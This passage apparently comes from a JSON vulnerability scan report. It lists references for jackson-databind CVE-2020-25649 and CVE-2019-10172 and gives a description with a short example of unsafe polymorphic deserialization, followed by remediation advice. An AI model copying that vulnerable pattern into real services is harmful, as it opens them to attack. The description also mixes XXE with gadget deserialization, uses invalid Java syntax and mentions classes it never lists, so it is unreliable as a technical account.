          "https://lists.apache.org/thread.html/r024b7bda9c43c5560d81238748775c5ecfe01b57280f90df1f773949%40%3Cissues.hive.apache.org%3E",
          "https://lists.apache.org/thread.html/r98bfe3b90ea9408f12c4b447edcb5638703d80bc782430aa0c210a54@%3Cissues.zookeeper.apache.org%3E",
          "https://lists.apache.org/thread.html/r61db8e7dcb56dc000a5387a88f7a473bacec5ee01b9ff3f55308aacc@%3Cdev.kafka.apache.org%3E",
          "https://lists.apache.org/thread.html/rc959cdb57c4fe198316130ff4a5ecbf9d680e356032ff2e9f4f05d54@%3Cjira.kafka.apache.org%3E",
          "https://lists.apache.org/thread.html/r6b11eca1d646f45eb0d35d174e6b1e47cfae5295b92000856bfb6304%40%3Cdev.kafka.apache.org%3E",
          "https://lists.apache.org/thread.html/rb674520b9f6c808c1bf263b1369e14048ec3243615f35cfd24e33604@%3Cissues.zookeeper.apache.org%3E",
          "https://www.oracle.com/security-alerts/cpuapr2022.html",
          "https://lists.apache.org/thread.html/r2f5c5479f99398ef344b7ebd4d90bc3316236c45d0f3bc42090efcd7%40%3Cissues.hive.apache.org%3E",
          "https://lists.apache.org/thread.html/re16f81d3ad49a93dd2f0cba9f8fc88e5fb89f30bf9a2ad7b6f3e69c1@%3Ccommits.karaf.apache.org%3E",
          "https://www.oracle.com/security-alerts/cpujan2022.html",
          "https://lists.apache.org/thread.html/ra95faf968f3463acb3f31a6fbec31453fc5045325f99f396961886d3%40%3Cissues.flink.apache.org%3E",
          "https://lists.apache.org/thread.html/r6b11eca1d646f45eb0d35d174e6b1e47cfae5295b92000856bfb6304%40%3Cusers.kafka.apache.org%3E",
          "https://lists.apache.org/thread.html/r3e6ae311842de4e64c5d560a475b7f9cc7e0a9a8649363c6cf7537eb%40%3Ccommits.karaf.apache.org%3E",
          "https://lists.apache.org/thread.html/r7cb5b4b3e4bd41a8042e5725b7285877a17bcbf07f4eb3f7b316af60@%3Creviews.iotdb.apache.org%3E",
          "https://lists.apache.org/thread.html/r8ae961c80930e2717c75025414ce48a432cea1137c02f648b1fb9524%40%3Cissues.hive.apache.org%3E",
          "https://lists.apache.org/thread.html/r2f5c5479f99398ef344b7ebd4d90bc3316236c45d0f3bc42090efcd7@%3Cissues.hive.apache.org%3E",
          "https://lists.apache.org/thread.html/r2882fc1f3032cd7be66e28787f04ec6f1874ac68d47e310e30ff7eb1%40%3Cjira.kafka.apache.org%3E",
          "https://lists.apache.org/thread.html/rc88f2fa2b7bd6443921727aeee7704a1fb02433e722e2abf677e0d3d@%3Ccommits.zookeeper.apache.org%3E",
          "https://lists.apache.org/thread.html/r90d1e97b0a743cf697d89a792a9b669909cc5a1692d1e0083a22e66c@%3Cissues.zookeeper.apache.org%3E",
          "https://lists.apache.org/thread.html/r73bef1bb601a9f093f915f8075eb49fcca51efade57b817afd5def07%40%3Ccommits.iotdb.apache.org%3E",
          "https://lists.apache.org/thread.html/rbf4ce74b0d1fa9810dec50ba3ace0caeea677af7c27a97111c06ccb7@%3Cdev.kafka.apache.org%3E",
          "https://lists.apache.org/thread.html/r0b8dc3acd4503e4ecb6fbd6ea7d95f59941168d8452ac0ab1d1d96bb%40%3Cissues.zookeeper.apache.org%3E",
          "https://lists.apache.org/thread.html/re16f81d3ad49a93dd2f0cba9f8fc88e5fb89f30bf9a2ad7b6f3e69c1%40%3Ccommits.karaf.apache.org%3E",
          "https://lists.apache.org/thread.html/r94c7e86e546120f157264ba5ba61fd29b3a8d530ed325a9b4fa334d7@%3Ccommits.zookeeper.apache.org%3E",
          "https://lists.apache.org/thread.html/r6b11eca1d646f45eb0d35d174e6b1e47cfae5295b92000856bfb6304@%3Cusers.kafka.apache.org%3E",
          "https://lists.apache.org/thread.html/rc959cdb57c4fe198316130ff4a5ecbf9d680e356032ff2e9f4f05d54%40%3Cjira.kafka.apache.org%3E",
          "https://lists.apache.org/thread.html/rbf4ce74b0d1fa9810dec50ba3ace0caeea677af7c27a97111c06ccb7@%3Cusers.kafka.apache.org%3E",
          "https://lists.apache.org/thread.html/r6a6df5647583541e3cb71c75141008802f7025cee1c430d4ed78f4cc@%3Cissues.hive.apache.org%3E",
          "https://lists.apache.org/thread.html/rc82ff47853289e9cd17f5cfbb053c04cafc75ee32e3d7223963f83bb@%3Cdev.knox.apache.org%3E",
          "https://lists.apache.org/thread.html/r61db8e7dcb56dc000a5387a88f7a473bacec5ee01b9ff3f55308aacc%40%3Cusers.kafka.apache.org%3E",
          "https://lists.apache.org/thread.html/r63c87aab97155f3f3cbe11d030c4a184ea0de440ee714977db02e956@%3Cjira.kafka.apache.org%3E",
          "https://lists.apache.org/thread.html/r8764bb835bcb8e311c882ff91dd3949c9824e905e880930be56f6ba3@%3Cuser.spark.apache.org%3E",
          "https://lists.apache.org/thread.html/r011d1430e8f40dff9550c3bc5d0f48b14c01ba8aecabd91d5e495386@%3Ccommits.turbine.apache.org%3E",
          "https://lists.apache.org/thread.html/r024b7bda9c43c5560d81238748775c5ecfe01b57280f90df1f773949@%3Cissues.hive.apache.org%3E",
          "https://lists.apache.org/thread.html/r605764e05e201db33b3e9c2e66ff620658f07ad74f296abe483f7042%40%3Creviews.iotdb.apache.org%3E",
          "https://lists.apache.org/thread.html/r7cb5b4b3e4bd41a8042e5725b7285877a17bcbf07f4eb3f7b316af60%40%3Creviews.iotdb.apache.org%3E",
          "https://lists.apache.org/thread.html/r6b11eca1d646f45eb0d35d174e6b1e47cfae5295b92000856bfb6304@%3Cdev.kafka.apache.org%3E",
          "https://lists.apache.org/thread.html/r2b6ddb3a4f4cd11d8f6305011e1b7438ba813511f2e3ab3180c7ffda%40%3Ccommits.druid.apache.org%3E",
          "https://lists.apache.org/thread.html/rd6f6bf848c2d47fa4a85c27d011d948778b8f7e58ba495968435a0b3%40%3Cissues.zookeeper.apache.org%3E",
          "https://lists.apache.org/thread.html/r900d4408c4189b376d1ec580ea7740ea6f8710dc2f0b7e9c9eeb5ae0@%3Cdev.zookeeper.apache.org%3E",
          "https://lists.apache.org/thread.html/rb674520b9f6c808c1bf263b1369e14048ec3243615f35cfd24e33604%40%3Cissues.zookeeper.apache.org%3E",
          "https://lists.apache.org/thread.html/r5b130fe668503c4b7e2caf1b16f86b7f2070fd1b7ef8f26195a2ffbd%40%3Cissues.hive.apache.org%3E",
          "https://lists.apache.org/thread.html/rd57c7582adc90e233f23f3727db3df9115b27a823b92374f11453f34%40%3Cissues.hive.apache.org%3E",
          "https://lists.apache.org/thread.html/re96dc7a13e13e56190a5d80f9e5440a0d0c83aeec6467b562fbf2dca@%3Cjira.kafka.apache.org%3E",
          "https://lists.apache.org/thread.html/r8ae961c80930e2717c75025414ce48a432cea1137c02f648b1fb9524@%3Cissues.hive.apache.org%3E",
          "https://lists.apache.org/thread.html/ra95faf968f3463acb3f31a6fbec31453fc5045325f99f396961886d3@%3Cissues.flink.apache.org%3E",
          "https://lists.apache.org/thread.html/r0881e23bd9034c8f51fdccdc8f4d085ba985dcd738f8520569ca5c3d%40%3Cissues.hive.apache.org%3E",
          "https://lists.apache.org/thread.html/re96dc7a13e13e56190a5d80f9e5440a0d0c83aeec6467b562fbf2dca%40%3Cjira.kafka.apache.org%3E",
          "https://lists.apache.org/thread.html/r61db8e7dcb56dc000a5387a88f7a473bacec5ee01b9ff3f55308aacc%40%3Cdev.kafka.apache.org%3E",
          "https://lists.apache.org/thread.html/rc15e90bbef196a5c6c01659e015249d6c9a73581ca9afb8aeecf00d2@%3Cjira.kafka.apache.org%3E",
          "https://lists.apache.org/thread.html/r78d53a0a269c18394daf5940105dc8c7f9a2399503c2e78be20abe7e%40%3Cjira.kafka.apache.org%3E",
          "https://lists.apache.org/thread.html/r900d4408c4189b376d1ec580ea7740ea6f8710dc2f0b7e9c9eeb5ae0%40%3Cdev.zookeeper.apache.org%3E",
          "https://lists.apache.org/thread.html/r011d1430e8f40dff9550c3bc5d0f48b14c01ba8aecabd91d5e495386%40%3Ccommits.turbine.apache.org%3E",
          "https://lists.apache.org/thread.html/r8937a7160717fe8b2221767163c4de4f65bc5466405cb1c5310f9080%40%3Cusers.kafka.apache.org%3E",
          "https://lists.apache.org/thread.html/r765283e145049df9b8998f14dcd444345555aae02b1610cfb3188bf8@%3Cnotifications.iotdb.apache.org%3E",
          "https://lists.apache.org/thread.html/r04529cedaca40c2ff90af4880493f9c88a8ebf4d1d6c861d23108a5a@%3Cnotifications.zookeeper.apache.org%3E",
          "https://www.oracle.com/security-alerts/cpuoct2021.html",
          "https://lists.apache.org/thread.html/r90d1e97b0a743cf697d89a792a9b669909cc5a1692d1e0083a22e66c%40%3Cissues.zookeeper.apache.org%3E",
          "https://lists.apache.org/thread.html/r407538adec3185dd35a05c9a26ae2f74425b15132470cf540f41d85b@%3Cissues.hive.apache.org%3E",
          "https://lists.apache.org/thread.html/r6e3d4f7991542119a4ca6330271d7fbf7b9fb3abab24ada82ddf1ee4@%3Cnotifications.zookeeper.apache.org%3E",
          "https://github.com/advisories/GHSA-288c-cq4h-88gq",
          "https://lists.apache.org/thread.html/r1b7ed0c4b6c4301d4dfd6fdbc5581b0a789d3240cab55d766f33c6c6@%3Cjira.kafka.apache.org%3E",
          "https://lists.apache.org/thread.html/rf1809a1374041a969d77afab21fc38925de066bc97e86157d3ac3402@%3Ccommits.karaf.apache.org%3E",
          "https://lists.apache.org/thread.html/r8764bb835bcb8e311c882ff91dd3949c9824e905e880930be56f6ba3%40%3Cuser.spark.apache.org%3E",
          "https://lists.apache.org/thread.html/r31f4ee7d561d56a0c2c2c6eb1d6ce3e05917ff9654fdbfec05dc2b83%40%3Ccommits.servicecomb.apache.org%3E",
          "https://lists.apache.org/thread.html/r8937a7160717fe8b2221767163c4de4f65bc5466405cb1c5310f9080@%3Cdev.kafka.apache.org%3E",
          "https://lists.apache.org/thread.html/rc15e90bbef196a5c6c01659e015249d6c9a73581ca9afb8aeecf00d2%40%3Cjira.kafka.apache.org%3E",
          "https://lists.apache.org/thread.html/r6cbd599b80e787f02ff7a1391d9278a03f37d6a6f4f943f0f01a62fb@%3Creviews.iotdb.apache.org%3E",
          "https://lists.apache.org/thread.html/r5b130fe668503c4b7e2caf1b16f86b7f2070fd1b7ef8f26195a2ffbd@%3Cissues.hive.apache.org%3E",
          "https://lists.apache.org/thread.html/rd57c7582adc90e233f23f3727db3df9115b27a823b92374f11453f34@%3Cissues.hive.apache.org%3E",
          "https://lists.apache.org/thread.html/rd317f15a675d114dbf5b488d27eeb2467b4424356b16116eb18a652d@%3Cjira.kafka.apache.org%3E",
          "https://lists.apache.org/thread.html/r91722ecfba688b0c565675f8bf380269fde8ec62b54d6161db544c22%40%3Ccommits.karaf.apache.org%3E",
          "https://lists.apache.org/thread.html/r95a297eb5fd1f2d3a2281f15340e2413f952e9d5503296c3adc7201a@%3Ccommits.tomee.apache.org%3E",
          "https://lists.apache.org/thread.html/ra409f798a1e5a6652b7097429b388650ccd65fd958cee0b6f69bba00@%3Cissues.hive.apache.org%3E",
          "https://lists.apache.org/thread.html/rc82ff47853289e9cd17f5cfbb053c04cafc75ee32e3d7223963f83bb%40%3Cdev.knox.apache.org%3E",
          "https://lists.apache.org/thread.html/r95a297eb5fd1f2d3a2281f15340e2413f952e9d5503296c3adc7201a%40%3Ccommits.tomee.apache.org%3E",
          "https://lists.apache.org/thread.html/r6a4f3ef6edfed2e0884269d84798f766779bbbc1005f7884e0800d61@%3Cdev.knox.apache.org%3E",
          "https://lists.apache.org/thread.html/r61db8e7dcb56dc000a5387a88f7a473bacec5ee01b9ff3f55308aacc@%3Cusers.kafka.apache.org%3E",
          "https://lists.apache.org/thread.html/r6cbd599b80e787f02ff7a1391d9278a03f37d6a6f4f943f0f01a62fb%40%3Creviews.iotdb.apache.org%3E",
          "https://lists.apache.org/thread.html/r86c78bf7656fdb2dab69cbf17f3d7492300f771025f1a3a65d5e5ce5@%3Ccommits.zookeeper.apache.org%3E",
          "https://lists.apache.org/thread.html/rdf9a34726482222c90d50ae1b9847881de67dde8cfde4999633d2cdc@%3Ccommits.zookeeper.apache.org%3E",
          "https://lists.apache.org/thread.html/r68d029ee74ab0f3b0569d0c05f5688cb45dd3abe96a6534735252805@%3Cnotifications.zookeeper.apache.org%3E",
          "https://github.com/FasterXML/jackson-databind/commit/3d932709abd0b5390efe67451653fc9efa9db677",
          "https://lists.apache.org/thread.html/r5f8a1608d758936bd6bbc5eed980777437b611537bf6fff40663fc71%40%3Cjira.kafka.apache.org%3E",
          "https://lists.apache.org/thread.html/r765283e145049df9b8998f14dcd444345555aae02b1610cfb3188bf8%40%3Cnotifications.iotdb.apache.org%3E",
          "https://security.netapp.com/advisory/ntap-20210108-0007/",
          "https://lists.apache.org/thread.html/r31f4ee7d561d56a0c2c2c6eb1d6ce3e05917ff9654fdbfec05dc2b83@%3Ccommits.servicecomb.apache.org%3E",
          "https://lists.apache.org/thread.html/ra1157e57a01d25e36b0dc17959ace758fc21ba36746de29ba1d8b130%40%3Cjira.kafka.apache.org%3E",
          "https://lists.apache.org/thread.html/r73bef1bb601a9f093f915f8075eb49fcca51efade57b817afd5def07@%3Ccommits.iotdb.apache.org%3E",
          "https://github.com/FasterXML/jackson-databind/issues/2589",
          "https://lists.apache.org/thread.html/r2eb66c182853c69ecfb52f63d3dec09495e9b65be829fd889a081ae1%40%3Cdev.hive.apache.org%3E",
          "https://lists.apache.org/thread.html/rd317f15a675d114dbf5b488d27eeb2467b4424356b16116eb18a652d%40%3Cjira.kafka.apache.org%3E",
          "https://lists.apache.org/thread.html/r605764e05e201db33b3e9c2e66ff620658f07ad74f296abe483f7042@%3Creviews.iotdb.apache.org%3E",
          "https://lists.apache.org/thread.html/r2eb66c182853c69ecfb52f63d3dec09495e9b65be829fd889a081ae1@%3Cdev.hive.apache.org%3E",
          "https://lists.apache.org/thread.html/r5f8a1608d758936bd6bbc5eed980777437b611537bf6fff40663fc71@%3Cjira.kafka.apache.org%3E",
          "https://lists.apache.org/thread.html/r68d029ee74ab0f3b0569d0c05f5688cb45dd3abe96a6534735252805%40%3Cnotifications.zookeeper.apache.org%3E",
          "https://lists.apache.org/thread.html/r2882fc1f3032cd7be66e28787f04ec6f1874ac68d47e310e30ff7eb1@%3Cjira.kafka.apache.org%3E",
          "https://lists.apache.org/thread.html/r63c87aab97155f3f3cbe11d030c4a184ea0de440ee714977db02e956%40%3Cjira.kafka.apache.org%3E",
          "https://lists.apache.org/thread.html/rdca8711bb7aa5d47a44682606cd0ea3497e2e922f22b7ee83e81e6c1@%3Cissues.hive.apache.org%3E",
          "https://lists.apache.org/thread.html/raf13235de6df1d47a717199e1ecd700dff3236632f5c9a1488d9845b%40%3Cjira.kafka.apache.org%3E",
          "https://lists.apache.org/thread.html/raf13235de6df1d47a717199e1ecd700dff3236632f5c9a1488d9845b@%3Cjira.kafka.apache.org%3E",
          "https://lists.apache.org/thread.html/r91722ecfba688b0c565675f8bf380269fde8ec62b54d6161db544c22@%3Ccommits.karaf.apache.org%3E",
          "https://www.oracle.com/security-alerts/cpujul2022.html",
          "https://lists.apache.org/thread.html/r1b7ed0c4b6c4301d4dfd6fdbc5581b0a789d3240cab55d766f33c6c6%40%3Cjira.kafka.apache.org%3E",
          "https://nvd.nist.gov/vuln/detail/CVE-2020-25649",
          "https://lists.apache.org/thread.html/rf1809a1374041a969d77afab21fc38925de066bc97e86157d3ac3402%40%3Ccommits.karaf.apache.org%3E",
          "https://lists.apache.org/thread.html/ra409f798a1e5a6652b7097429b388650ccd65fd958cee0b6f69bba00%40%3Cissues.hive.apache.org%3E",
          "https://lists.apache.org/thread.html/rc88f2fa2b7bd6443921727aeee7704a1fb02433e722e2abf677e0d3d%40%3Ccommits.zookeeper.apache.org%3E",
          "https://lists.apache.org/thread.html/r0881e23bd9034c8f51fdccdc8f4d085ba985dcd738f8520569ca5c3d@%3Cissues.hive.apache.org%3E",
          "https://lists.apache.org/thread.html/r0b8dc3acd4503e4ecb6fbd6ea7d95f59941168d8452ac0ab1d1d96bb@%3Cissues.zookeeper.apache.org%3E",
          "https://www.oracle.com/security-alerts/cpuApr2021.html",
          "https://lists.apache.org/thread.html/r04529cedaca40c2ff90af4880493f9c88a8ebf4d1d6c861d23108a5a%40%3Cnotifications.zookeeper.apache.org%3E",
          "https://lists.apache.org/thread.html/r8937a7160717fe8b2221767163c4de4f65bc5466405cb1c5310f9080@%3Cusers.kafka.apache.org%3E",
          "https://lists.apache.org/thread.html/r45e7350dfc92bb192f3f88e9971c11ab2be0953cc375be3dda5170bd@%3Cissues.flink.apache.org%3E",
          "https://bugzilla.redhat.com/show_bug.cgi?id=1887664",
          "https://github.com/FasterXML/jackson-databind/commit/612f971b78c60202e9cd75a299050c8f2d724a59",
          "https://lists.apache.org/thread.html/rdca8711bb7aa5d47a44682606cd0ea3497e2e922f22b7ee83e81e6c1%40%3Cissues.hive.apache.org%3E",
          "https://lists.apache.org/thread.html/ra1157e57a01d25e36b0dc17959ace758fc21ba36746de29ba1d8b130@%3Cjira.kafka.apache.org%3E",
          "https://lists.apache.org/thread.html/r407538adec3185dd35a05c9a26ae2f74425b15132470cf540f41d85b%40%3Cissues.hive.apache.org%3E",
          "https://lists.apache.org/thread.html/r98bfe3b90ea9408f12c4b447edcb5638703d80bc782430aa0c210a54%40%3Cissues.zookeeper.apache.org%3E",
          "https://security.netapp.com/advisory/ntap-20210108-0007"
        ],
        "extended_information": {
          "short_description": "A typing issue in multiple classes in Jackson-databind allows a remote attacker to perform XXE attack and leads to data leakage.",
          "full_description": "[Jackson-databind]( https://github.com/FasterXML/jackson-databind) (previously known as \"jackson-mapper-asl\") is a streaming API library for Java. One of its components, `ObjectMapper` is responsible for serialization and deserialization of Java objects.\nJackson also supports deserialization of polymorphic types when `default typing` is enabled. This can be enabled by adding `@JsonTypeInfo(use = Id.CLASS) ` according to your function to determine its type or by calling `enableDefaultTyping()` on your `Objectmapper`..\nThis identifier allows the `ObjectMapper` to accept type identifiers and interpret them as an object like so:\n```\n{ \"phone\" : {\n \"@class\" : \"package.InternationalNumber\",\n \"areaCode\" : 555,\n ...\n }\n}\n```\n\n`ObjectMapper` can accept inputs from various of sources such as files, URL, JSON, web requests and many more, for example:\n```\n// Object from local JSON file\nPhone p = ObjectMapper.readValue(new File(\"phone.json\"), Phone.class);\nOr\n// Object from HTTP-hosted JSON file\nPhone p = ObjectMapper.readValue(new URL(\"https://www.somedomain.com/src/test/json_car.json\"), Phone.class);\n\n```\n\nSupport for polymorphic type deserialization allows an attacker to create almost any class at the server-side, assuming an attacker-supplied JSON file is deserialized. \nA vulnerable server-side handling of the serialized data may look like this:\n\n```\nObjectMapper mapper = new ObjectMapper();\nmapper.enableDefaultTyping()\nobj = mapper.readValue(jsonContent, java.lang.Object.java_class)\n```\n\nThe server-side creates the desired object by calling `mapper.readValue(…)` which will call all of its setters with the arguments supplied within the request.\n\nTo exploit this issue, an attacker has to find code modules or functions included in the Java classpath that aren’t [blacklisted](https://github.com/FasterXML/jackson-databind/blob/9593e16cf5a3d289a9c584f7123639655de9ddac/src/main/java/com/fasterxml/jackson/databind/jsontype/impl/SubTypeValidator.java) by Jackson-databind, that will allow the attacker to perform operations with some security impact (such as remote code injection) when chained together. These code modules are also known as [gadgets]( https://vickieli.dev/insecure%20deserialization/java-deserialization/).\n\nSpecifically, the `setExpandEntityReferences(false)` API call failed to prevent entity expansion and may be harmful to data integrity.  The fix added two more settings to prevent data expansion:\n```\nfactory.setFeature(\"http://apache.org/xml/features/disallow-doctype-decl\", true);\nfactory.setFeature(\"http://apache.org/xml/features/nonvalidating/load-external-dtd\", false);\n```\n\n\nExploitation requires:\n\n-\tDefault typing enabled for external JSON endpoints\n-\tThe vulnerable java service includes one of the above classes in its Java classpath\n-\tThe service has polymorphic type handling enabled\n-\tThe service deserializes objects with nominal type of `java.lang.Object`.",
          "jfrog_research_severity": "Medium",
          "jfrog_research_severity_reasons": [
            {
              "name": "The prerequisites for exploiting the issue are extremely unlikely",
              "description": "The exploitation prerequisites are unlikely:\n-\tDefault typing enabled for external JSON endpoints\n-\tThe service has polymorphic type handling enabled\n-\tThe service deserializes objects with nominal type of `java.lang.Object`.",
              "is_positive": true
            },
            {
              "name": "Exploitation of the issue is only possible when the vulnerable component is used in a specific manner. The attacker has to perform per-target research to determine the vulnerable attack vector",
              "description": "The attacker must find remote input that propagates into an `ObjectMapper.readValue` call",
              "is_positive": true
            }
          ],
          "remediation": "##### Development mitigations\n\nAvoid enabling default typing (`mapper.enableDefaultTyping()`)\n\n##### Development mitigations\n\nAvoid using `java.lang.Object` as the deserialized object type. For example, a vulnerable usage would be - `obj = mapper.readValue(content, java.lang.Object.java_class)`. Instead - try to deserialize to the specific object type that you need, instead of `java.lang.Object`"
        }
      },
      {
        "cves": [
          {
            "cve": "CVE-2019-10172",
            "cvss_v2_score": "5.0",
            "cvss_v2_vector": "CVSS:2.0/AV:N/AC:L/Au:N/C:N/I:P/A:N",
            "cvss_v3_score": "7.5",
            "cvss_v3_vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:H/A:N",
            "cwe": [
              "CWE-611"
            ],
            "cwe_details": {
              "CWE-611": {
                "name": "Improper Restriction of XML External Entity Reference",
                "description": "The product processes an XML document that can contain XML entities with URIs that resolve to documents outside of the intended sphere of control, causing the product to embed incorrect documents into its output."
              }
            }
          }
        ],
        "summary": "A flaw was found in org.codehaus.jackson:jackson-mapper-asl:1.9.x libraries. XML external entity vulnerabilities similar CVE-2016-3720 also affects codehaus jackson-mapper-asl libraries but in different classes.",
        "severity": "High",
        "components": {
          "gav://com.fasterxml.jackson.core:jackson-databind:2.9.5": {
            "fixed_versions": [
              "[2.6.7.3]",
              "[2.7.9.5]",
              "[2.8.11.3]",
              "[2.9.8]"
            ],
            "impact_paths": [
              [
                {
                  "component_id": "gav://com.fasterxml.jackson.core:jackson-databind:2.9.5"
                }
              ]
            ]
          }
        },
        "issue_id": "XRAY-91810",
        "references": [
          "https://lists.apache.org/thread.html/ra37700b842790883b9082e6b281fb7596f571b13078a4856cd38f2c2%40%3Ccommits.cassandra.apache.org%3E",
          "https://lists.apache.org/thread.html/r1f07e61b3ebabd3e5b4aa97bf1b26d98b793fdfa29a23dac60633f55%40%3Ccommon-issues.hadoop.apache.org%3E",
          "https://lists.debian.org/debian-lts-announce/2020/01/msg00037.html",
          "https://nvd.nist.gov/vuln/detail/CVE-2019-10172",
          "https://lists.apache.org/thread.html/rce00a1c60f7df4b10e72fa87827c102f55b074bb91993631df2c21f9%40%3Cdev.hive.apache.org%3E",
          "https://lists.apache.org/thread.html/r500867b74f42230a3d65b8aec31fc93ac390eeae737c91a759ab94cb%40%3Cissues.hive.apache.org%3E",
          "https://lists.apache.org/thread.html/re646dcc2739d92117bf9a76a33c600ed3b65e8b4e9b6f441e366b72b%40%3Ccommits.cassandra.apache.org%3E",
          "https://lists.apache.org/thread.html/r21ac3570ce865b8f1e5d26e492aeb714a6aaa53a0c9a6f72ef181556@%3Ccommits.cassandra.apache.org%3E",
          "https://lists.apache.org/thread.html/r634468eb3218ab02713128ff6f4818c618622b2b3de4d958138dde49@%3Ccommits.cassandra.apache.org%3E",
          "https://lists.apache.org/thread.html/rd3a34d663e2a25b9ab1e8a1a94712cd5f100f098578aec79af48161e@%3Ccommon-dev.hadoop.apache.org%3E",
          "https://lists.apache.org/thread.html/r4bbfa1439d7a4e1712e260bfc3d90f7cf997abfd641cccde6432d4ab@%3Ccommits.cassandra.apache.org%3E",
          "https://lists.apache.org/thread.html/r0fbf2c60967bc9f73d7f5a62ad3b955789f9a14b950f42e99fca9b4e%40%3Cissues.hive.apache.org%3E",
          "https://lists.apache.org/thread.html/rb036bf32e4dacc49335e3bdc1be8e53d6f54df692ac8e2251a6884bd@%3Ccommon-issues.hadoop.apache.org%3E",
          "https://lists.apache.org/thread.html/r43c6f75d203b8afc4fbd6c3200db0384a18a11c59d085b1a9bb0ccfe@%3Cuser.hadoop.apache.org%3E",
          "https://lists.apache.org/thread.html/r386966780034aadee69ffd82d44555117c9339545b9ce990fe490a3e@%3Ccommits.cassandra.apache.org%3E",
          "https://lists.apache.org/thread.html/r4176155240cdc36aad7869932d9c29551742c7fa630f209fb4a8e649@%3Ccommon-issues.hadoop.apache.org%3E",
          "https://lists.apache.org/thread.html/r385c35a7c6f4acaacf37fe22922bb8e2aed9d322d0fa6dc1d45acddb@%3Ccommits.cassandra.apache.org%3E",
          "https://lists.apache.org/thread.html/r1edabcfacdad42d3c830464e9cf07a9a489059a7b7a8642cf055542d%40%3Cissues.hive.apache.org%3E",
          "https://lists.apache.org/thread.html/r386966780034aadee69ffd82d44555117c9339545b9ce990fe490a3e%40%3Ccommits.cassandra.apache.org%3E",
          "https://lists.apache.org/thread.html/r04ecadefb27cda84b699130b11b96427f1d8a7a4066d8292f7f15ed8%40%3Ccommon-issues.hadoop.apache.org%3E",
          "https://lists.apache.org/thread.html/r25e25973e9577c62fd0221b4b52990851adf11cbe33036bd67d4b13d@%3Ccommits.cassandra.apache.org%3E",
          "https://lists.apache.org/thread.html/rb036bf32e4dacc49335e3bdc1be8e53d6f54df692ac8e2251a6884bd%40%3Ccommon-issues.hadoop.apache.org%3E",
          "https://lists.apache.org/thread.html/r48a32f2dd6976d33f7a12b7e09ec7ea1895f8facba82b565587c28ac%40%3Ccommon-issues.hadoop.apache.org%3E",
          "https://lists.apache.org/thread.html/r48a32f2dd6976d33f7a12b7e09ec7ea1895f8facba82b565587c28ac@%3Ccommon-issues.hadoop.apache.org%3E",
          "https://lists.apache.org/thread.html/r4176155240cdc36aad7869932d9c29551742c7fa630f209fb4a8e649%40%3Ccommon-issues.hadoop.apache.org%3E",
          "https://lists.apache.org/thread.html/rd3a34d663e2a25b9ab1e8a1a94712cd5f100f098578aec79af48161e%40%3Ccommon-dev.hadoop.apache.org%3E",
          "https://lists.apache.org/thread.html/r0066c1e862613de402fee04e81cbe00bcd64b64a2711beb9a13c3b25@%3Ccommits.cassandra.apache.org%3E",
          "https://lists.apache.org/thread.html/r08e1b73fabd986dcd2ddd7d09480504d1472264bed2f19b1d2002a9c%40%3Ccommon-issues.hadoop.apache.org%3E",
          "https://lists.apache.org/thread.html/rb8c09b14fd57d855dc21e0a037dc29258c2cbe9c1966bfff453a02e4@%3Ccommon-issues.hadoop.apache.org%3E",
          "https://lists.apache.org/thread.html/r1f07e61b3ebabd3e5b4aa97bf1b26d98b793fdfa29a23dac60633f55@%3Ccommon-issues.hadoop.apache.org%3E",
          "https://lists.apache.org/thread.html/r33d25a342af84102903cd9dec8338a5bcba3ecfce10505bdfe793b92@%3Ccommon-issues.hadoop.apache.org%3E",
          "https://lists.apache.org/thread.html/r6dea2a887f5eb1d68f124d64b14cd1a04f682f06de8cd01b7e4214e0%40%3Cissues.hive.apache.org%3E",
          "https://lists.apache.org/thread.html/r6dea2a887f5eb1d68f124d64b14cd1a04f682f06de8cd01b7e4214e0@%3Cissues.hive.apache.org%3E",
          "https://lists.apache.org/thread.html/r500867b74f42230a3d65b8aec31fc93ac390eeae737c91a759ab94cb@%3Cissues.hive.apache.org%3E",
          "https://lists.apache.org/thread.html/r356592d9874ab4bc9da4754592f8aa6edc894c95e17e58484bc2af7a@%3Cissues.hive.apache.org%3E",
          "https://lists.apache.org/thread.html/rb47911c179c9f3e8ea3f134b5645e63cd20c6fc63bd0b43ab5864bd1@%3Ccommits.cassandra.apache.org%3E",
          "https://lists.apache.org/thread.html/r634468eb3218ab02713128ff6f4818c618622b2b3de4d958138dde49%40%3Ccommits.cassandra.apache.org%3E",
          "https://lists.apache.org/thread.html/r385c35a7c6f4acaacf37fe22922bb8e2aed9d322d0fa6dc1d45acddb%40%3Ccommits.cassandra.apache.org%3E",
          "https://lists.apache.org/thread.html/r4bbfa1439d7a4e1712e260bfc3d90f7cf997abfd641cccde6432d4ab%40%3Ccommits.cassandra.apache.org%3E",
          "https://lists.apache.org/thread.html/r80e8882c86c9c17a57396a5ef7c4f08878d629a0291243411be0de3a%40%3Ccommits.cassandra.apache.org%3E",
          "https://lists.apache.org/thread.html/r0d8c3e32a0a2d8a0b6118f5b3487d363afdda80c996d7b930097383d@%3Ccommon-issues.hadoop.apache.org%3E",
          "https://lists.apache.org/thread.html/rd27730cfc3066dfcf15927c8e800603728d5dedf17eee1f8c6e3507c@%3Ccommon-issues.hadoop.apache.org%3E",
          "https://lists.apache.org/thread.html/r25e25973e9577c62fd0221b4b52990851adf11cbe33036bd67d4b13d%40%3Ccommits.cassandra.apache.org%3E",
          "https://lists.apache.org/thread.html/r37eb6579fa0bf94a72b6c978e2fee96f68a2b1b3ac1b1ce60aee86cf@%3Ccommits.cassandra.apache.org%3E",
          "https://lists.apache.org/thread.html/r5f16a1bd31a7e94ca78eda686179930781aa3a4a990cd55986703581%40%3Cdev.hive.apache.org%3E",
          "https://lists.apache.org/thread.html/r5f16a1bd31a7e94ca78eda686179930781aa3a4a990cd55986703581@%3Cdev.hive.apache.org%3E",
          "https://lists.apache.org/thread.html/r43c6f75d203b8afc4fbd6c3200db0384a18a11c59d085b1a9bb0ccfe%40%3Cuser.hadoop.apache.org%3E",
          "https://lists.apache.org/thread.html/r37eb6579fa0bf94a72b6c978e2fee96f68a2b1b3ac1b1ce60aee86cf%40%3Ccommits.cassandra.apache.org%3E",
          "https://lists.apache.org/thread.html/rb47911c179c9f3e8ea3f134b5645e63cd20c6fc63bd0b43ab5864bd1%40%3Ccommits.cassandra.apache.org%3E",
          "https://lists.apache.org/thread.html/r1edabcfacdad42d3c830464e9cf07a9a489059a7b7a8642cf055542d@%3Cissues.hive.apache.org%3E",
